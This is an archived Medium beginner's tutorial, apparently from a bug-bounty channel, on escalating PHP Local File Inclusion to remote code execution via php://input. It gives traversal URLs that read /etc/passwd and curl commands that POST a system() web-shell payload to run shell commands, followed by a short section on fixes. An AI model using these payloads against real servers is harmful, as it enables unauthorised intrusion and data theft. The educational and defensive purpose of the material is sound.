# From LFI to RCE via php

- **Source URL:** https://medium.com/@zoningxtr/from-lfi-to-rce-via-php-input-the-complete-beginner-friendly-guide-e38e79924521?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20250905074308/https://medium.com/@zoningxtr/from-lfi-to-rce-via-php-input-the-complete-beginner-friendly-guide-e38e79924521?source=rss------bug_bounty-5
- **Fetched:** 2026-11-25
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/10105 (id 10105)
- **Method:** trafilatura readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# 💥 From LFI to RCE via `php://input` — The Complete Beginner-Friendly Guide 🚀

By

*Beginner’s guide to exploiting php://input for turning Local File Inclusion (LFI) into Remote Code Execution (RCE). Step-by-step with examples & fixes*

D*isclaimer: This content is for educational purposes only. The author is not responsible for any use or misuse of the information provided. You are solely responsible for your actions. Always act ethically and ensure you have proper authorization.*

*Ever wondered how a seemingly harmless Local File Inclusion (LFI) vulnerability can lead to full-blown Remote Code Execution (RCE)? One stealthy method is using php://input with POST data to inject PHP code. This guide walks you through every step with no experience required!*


## 💡 What is `php://input`?

`php://input` is a PHP I/O stream that allows you to **read raw POST data**. Unlike `$_POST`, it gives you full access to whatever was sent in the body — even if it isn’t `application/x-www-form-urlencoded`.

This makes it useful for sending custom data, **including PHP payloads** — which can be executed if included via an LFI vulnerability.

## 🪨 Step-by-Step Exploitation Plan

## ✅ Step 1: Find an LFI Vulnerability

Start by checking for LFI:

`https://target.com/index.php?page=../../../../etc/passwd`
If the server shows Linux system users, LFI is likely present.

## ✅ Step 2: Check for PHP Interpretation

Now try including a PHP wrapper:

`https://target.com/index.php?page=php://input`
This tells the PHP interpreter to include and **evaluate** the raw POST data.

## ✅ Step 3: Send PHP Code via POST

You now need to send PHP code in the **body** of the request. Here’s how:

### Using `curl`:

```
curl -X POST -d "<?php system($_GET['cmd']); ?>" \
     "https://target.com/index.php?page=php://input&cmd=whoami"
```
This sends the payload as POST data:

`<?php system($_GET['cmd']); ?>`
and then includes it via `php://input`. If parsed, it will execute the `cmd` parameter.

## 🔧 Testing Further Commands

Try other system commands:

```
curl -X POST -d "<?php system($_GET['cmd']); ?>" \
     "https://target.com/index.php?page=php://input&cmd=ls"
```
```
curl -X POST -d "<?php system($_GET['cmd']); ?>" \
     "https://target.com/index.php?page=php://input&cmd=cat+/etc/passwd"
```
## 📄 Full Walkthrough Example

Test LFI:

`https://target.com/index.php?page=../../../../etc/passwd`
Confirm `php://input` is parsed:

`https://target.com/index.php?page=php://input`
Send POST request with PHP payload:

```
curl -X POST -d "<?php system($_GET['cmd']); ?>" \
     "https://target.com/index.php?page=php://input&cmd=id"
```
Observe output like:

`uid=33(www-data) gid=33(www-data) groups=33(www-data)`
## 🛡️ How to Prevent This Vulnerability

## ⛔ Never include user input directly:

```
// ❌ Vulnerable:
include($_GET['page']);
```
## ✅ Always use a whitelist:

```
$pages = ['home' => 'home.php', 'about' => 'about.php'];
if (isset($_GET['page']) && isset($pages[$_GET['page']])) {
    include($pages[$_GET['page']]);
}
```
## 🔒 Secure PHP Configuration

- `allow_url_include = Off`
- `allow_url_fopen = Off`
- Disable unused wrappers if possible

## 🔨 Disable `php://input` parsing as code

- Avoid using `include()` or `require()` on streams
- Use `file_get_contents('php://input')` only with proper sanitization

## 🤖 Final Thoughts

`php://input` is a powerful wrapper that lets attackers turn LFI into RCE **without touching the filesystem**. This method is often overlooked but extremely dangerous when available.

*Always assume LFI is more than just file reading. With wrappers like php://input, attackers can run arbitrary code.*
